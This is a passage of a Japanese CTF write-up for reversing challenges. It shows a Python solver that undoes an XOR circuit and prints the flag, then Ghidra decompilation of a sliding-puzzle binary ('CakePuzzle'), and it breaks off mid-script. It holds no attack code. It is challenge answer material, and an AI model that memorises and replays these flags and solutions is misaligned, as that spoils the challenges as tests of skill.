これらのことから、<code>CIRCUIT</code>関数は次のような操作を0x1234回繰り替えし行っていることが分かります。
$$
\begin{align}
\mathrm{param2[local28]} &\leftarrow \mathrm{param1[local28]} \oplus \mathrm{param1[local28 + 1]} \ (\mathrm{local28} = 0 \cdots \mathrm{0xfe}) \nonumber \\
\mathrm{param2[0xff]} &\leftarrow \mathrm{0xff} \oplus 1 \nonumber \\
\mathrm{param1} &\leftarrow \mathrm{param2} \nonumber
\end{align}
$$
xorの性質の一つである$a\oplus b \oplus b = a$を用いることで以上の演算の逆演算を行うことが可能です。ソルバーは次のようになりました。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>answer_sequence</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01\x01\x01\x01\x01\x00\x00\x01\x01\x00\x00\x01\x00\x00\x01\x00\x00\x01\x01\x00\x00\x00\x00\x01\x01\x01\x01\x01\x00\x00\x01\x01\x01\x01\x00\x01\x00\x01\x01\x01\x00\x00\x00\x01\x01\x00\x01\x01\x01\x01\x00\x01\x00\x01\x00\x00\x01\x00\x01\x00\x01\x01\x00\x01\x00\x00\x01\x01\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x01\x00\x01\x01\x01\x00\x00\x01\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x01\x01\x01\x01\x00\x01\x01\x00\x00\x00\x01\x01\x00\x00\x01\x01\x00\x01\x01\x00\x00\x00\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x00\x01\x00\x00\x01\x01\x00\x01\x01\x01\x00\x01\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x01\x01\x00\x01\x01\x00\x01\x01\x00\x01\x00\x01\x00\x01\x00\x00\x01\x01\x01\x01\x01\x00\x01\x01\x00\x01\x01\x01\x00\x00\x01\x00\x01\x01\x00\x01\x01\x00\x00\x01\x00\x00\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x01\x00\x01\x01\x00</span><span class=s1>&#39;</span>

<span class=n>index_list</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>

<span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1234</span><span class=p>):</span>
    <span class=n>tmp_answer_sequence</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>index_list</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mh>0xff</span><span class=p>:</span>
            <span class=n>tmp_answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=mi>1</span>
        <span class=k>else</span><span class=p>:</span>
            <span class=n>tmp_answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>tmp_answer_sequence</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span>
    <span class=n>answer_sequence</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>tmp_answer_sequence</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>get_flag_str</span><span class=p>(</span><span class=n>flag_sequence</span><span class=p>):</span>
    <span class=n>flag</span> <span class=o>=</span> <span class=p>[]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>):</span>
        <span class=n>a</span> <span class=o>=</span> <span class=n>flag_sequence</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=p>:(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>8</span><span class=p>]</span>
        <span class=n>flag_char</span> <span class=o>=</span> <span class=mi>0</span>
        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
            <span class=n>flag_char</span> <span class=o>+=</span> <span class=n>a</span><span class=p>[</span><span class=n>j</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>j</span><span class=p>)</span>
        <span class=n>flag</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>flag_char</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>chr</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>flag</span><span class=p>]))</span>

<span class=n>get_flag_str</span><span class=p>(</span><span class=n>answer_sequence</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><p>これを実行してflagが得られました。
よってflagは<code>CakeCTF{h2fsCHAo3xOsBZefcWudTa4}</code>です。</p>
<h3 id=cakepuzzle-rev>CakePuzzle [rev]</h3>
<p>問題文を見てみると、ncでプログラムにアクセスするタイプの問題のようです。
ncでプログラムにアクセスしてみます。<code>></code>だけ出てきて文字の入力が可能でした。
しかし、どんな文字を打っても<code>></code>しか出てきません。</p>
<p>渡されるファイルは<code>chal</code>のみです。ファイル形式は以下の通りでした。ELFです。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4c2b97895e9493536557f72e973e5ed194a49854, for GNU/Linux 3.2.0, not stripped
</code></pre></td></tr></table>
</div>
</div><p>Ghidaraで静的解析します。main関数を見てみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>int</span> <span class=n>iVar1</span><span class=p>;</span>
  <span class=n>undefined8</span> <span class=n>uVar2</span><span class=p>;</span>
  <span class=kt>char</span> <span class=n>local_78</span> <span class=p>[</span><span class=mi>112</span><span class=p>];</span>
  
  <span class=n>alarm</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
  <span class=k>while</span><span class=p>(</span> <span class=nb>true</span> <span class=p>)</span> <span class=p>{</span>
    <span class=n>uVar2</span> <span class=o>=</span> <span class=n>q</span><span class=p>();</span>
    <span class=k>if</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>uVar2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>win</span><span class=p>();</span>
    <span class=p>}</span>
    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
    <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
    <span class=n>iVar1</span> <span class=o>=</span> <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DAT_00102019</span><span class=p>,</span><span class=n>local_78</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
    <span class=n>e</span><span class=p>(</span><span class=n>local_78</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
  <span class=p>}</span>
                    <span class=cm>/* WARNING: Subroutine does not return */</span>
  <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>win</code>関数があります。これが実行できれば、flagを見せてもらえるようです。
pwn問ではないので、プログラムがどうなっているか解析を進めていけば解けるだろうと考え、
一文字関数の<code>e</code>や<code>q</code>関数を見ていきます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>e</span><span class=p>(</span><span class=kt>char</span> <span class=n>param_1</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>int</span> <span class=n>local_10</span><span class=p>;</span>
  <span class=kt>int</span> <span class=n>local_c</span><span class=p>;</span>
  
  <span class=n>s</span><span class=p>(</span><span class=o>&amp;</span><span class=n>local_c</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_10</span><span class=p>);</span>
  <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;U&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
        <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_c</span> <span class=o>+</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>&lt;</span> <span class=sc>&#39;V&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;R&#39;</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
          <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>&lt;</span> <span class=sc>&#39;S&#39;</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;D&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
          <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
            <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_c</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
        <span class=p>}</span>
      <span class=p>}</span>
      <span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;L&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
        <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
          <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_10</span> <span class=o>+</span> <span class=o>-</span><span class=mi>1</span><span class=p>))</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
      <span class=p>}</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>標準入力から入力された文字列の先頭1文字が引数に入力されます。
入力の文字に意味を持つのはU、R、D、Lのみのようです。そして、local_10、local_cの条件がありますが、基本的にはこれらどれかの文字を入力すると、<code>f</code>関数が呼ばれるようです。
<code>f</code>関数に入力されている<code>M</code>のインデックスも4の倍数であることも気になります。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>f</span><span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=n>param_1</span><span class=p>,</span><span class=n>uint</span> <span class=o>*</span><span class=n>param_2</span><span class=p>)</span>

<span class=p>{</span>
  <span class=o>*</span><span class=n>param_1</span> <span class=o>=</span> <span class=o>*</span><span class=n>param_1</span> <span class=o>^</span> <span class=o>*</span><span class=n>param_2</span><span class=p>;</span> 
  <span class=o>*</span><span class=n>param_2</span> <span class=o>=</span> <span class=o>*</span><span class=n>param_2</span> <span class=o>^</span> <span class=o>*</span><span class=n>param_1</span><span class=p>;</span> <span class=c1>// param_2 = param_2 ^ (param_1 ^ param_2) = param_1
</span><span class=c1></span>  <span class=o>*</span><span class=n>param_1</span> <span class=o>=</span> <span class=o>*</span><span class=n>param_1</span> <span class=o>^</span> <span class=o>*</span><span class=n>param_2</span><span class=p>;</span> <span class=c1>// param_1 = (param_1 ^ param_2) ^ param_1 = param_2
</span><span class=c1></span>  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>f</code>関数は引数の値どおしでxorしています。計算を追うと、これは引数である<code>param_1</code>と<code>param_2</code>の値を交換する処理であることが分かります。
<code>q</code>関数も見てみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>undefined8</span> <span class=nf>q</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>int</span> <span class=n>local_10</span><span class=p>;</span>
  <span class=kt>int</span> <span class=n>local_c</span><span class=p>;</span>
  
  <span class=n>local_c</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
  <span class=k>do</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=mi>2</span> <span class=o>&lt;</span> <span class=n>local_c</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=k>for</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_10</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>;</span> <span class=n>local_10</span> <span class=o>=</span> <span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&lt;=</span>
          <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_c</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&lt;=</span>
          <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=n>local_c</span> <span class=o>=</span> <span class=n>local_c</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
  <span class=p>}</span> <span class=k>while</span><span class=p>(</span> <span class=nb>true</span> <span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>M</code>の状態から比較を行い、すべての比較を通らなかったら0を返してくれるようです。
<code>main</code>関数でもわかる通り、<code>q</code>関数から0を返してもらえれば<code>win</code>関数を実行してくれます。
以上からU, R, D, Lを<code>></code>のあとに入力していくことで<code>M</code>にある値の交換を行いながら<code>q</code>関数で0を返してくれるような<code>M</code>の状態を作り出すことがこのプログラムの意図であることが分かります。
4の倍数となっている理由は<code>M</code>について一つインデックスを決めたとき、int型として解釈するためです。int型のサイズは4バイトです。<code>M</code>は次のようになっています。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>\xdb\x56\x58\x44\x04\x03\x23\x4c\x9f\x44\x22\x00\xb7\x96\x1a\x67\xf7\x44\x56\x6c\x87\x62\xf4\x7f\x29\xc8\xe9\x6e\x72\x2e\xda\x5c\x00\x00\x00\x00\xc9\x88\x8e\x69\x4f\x5a\xe6\x33\x54\x5c\xcc\x50\x1a\x83\x49\x13\x74\x8f\xc8\x53\xb9\x8a\x85\x25\xd8\x76\xf9\x72
</code></pre></td></tr></table>
</div>
</div><p>これを4バイトごと取り出しそれぞれをint型で解釈します。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>\xdb\x56\x58\x44 = 1146640091
\x04\x03\x23\x4c = 1277362948
\x9f\x44\x22\x00 = 0002245791
\xb7\x96\x1a\x67 = 1729795767 
\xf7\x44\x56\x6c = 1817593079
\x87\x62\xf4\x7f = 2146722439
\x29\xc8\xe9\x6e = 186081488
\x72\x2e\xda\x5c = 1557802610
\x00\x00\x00\x00 = 0000000000
\xc9\x88\x8e\x69 = 1770948809
\x4f\x5a\xe6\x33 = 0870734415
\x54\x5c\xcc\x50 = 1355570260
\x1a\x83\x49\x13 = 0323584794
\x74\x8f\xc8\x53 = 1405652852
\xb9\x8a\x85\x25 = 0629508793
\xd8\x76\xf9\x72 = 1928951512
</code></pre></td></tr></table>
</div>
</div><p><code>M</code>を呼び出すインデックスや<code>M</code>がどのように動いているのか確認したいので、今回はpythonでこれらの関数を再実装し動かしてみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>M_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xdb\x56\x58\x44\x04\x03\x23\x4c\x9f\x44\x22\x00\xb7\x96\x1a\x67\xf7\x44\x56\x6c\x87\x62\xf4\x7f\x29\xc8\xe9\x6e\x72\x2e\xda\x5c\x00\x00\x00\x00\xc9\x88\x8e\x69\x4f\x5a\xe6\x33\x54\x5c\xcc\x50\x1a\x83\x49\x13\x74\x8f\xc8\x53\xb9\x8a\x85\x25\xd8\x76\xf9\x72</span><span class=s1>&#39;</span>

<span class=n>M</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>*</span><span class=mi>4</span><span class=p>)]</span>
<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>*</span><span class=mi>4</span><span class=p>):</span>
    <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
